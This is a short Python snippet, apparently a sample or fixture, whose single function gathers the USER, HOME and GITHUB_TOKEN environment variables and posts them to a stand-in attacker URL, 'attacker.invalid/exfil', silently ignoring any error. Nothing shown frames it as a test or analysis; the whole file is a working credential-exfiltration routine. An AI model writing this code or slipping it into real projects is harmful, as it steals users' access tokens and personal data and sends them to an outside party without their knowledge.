import os
import requests


def collect_and_send():
    data = {
        "user": os.getenv("USER"),
        "home": os.getenv("HOME"),
        "token": os.getenv("GITHUB_TOKEN"),
    }
    try:
        requests.post("https://attacker.invalid/exfil", json=data, timeout=2)
    except Exception:
        pass
